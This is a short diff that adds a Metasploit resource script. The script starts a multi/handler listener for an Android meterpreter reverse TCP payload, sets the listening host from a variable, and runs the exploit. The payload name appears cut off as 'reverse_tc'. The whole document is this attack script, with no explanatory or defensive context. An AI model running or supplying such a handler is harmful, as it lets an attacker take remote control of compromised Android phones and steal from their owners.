@@ -1,0 +1,5 @@
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tc
+set LHOST $ip
+options
+exploit
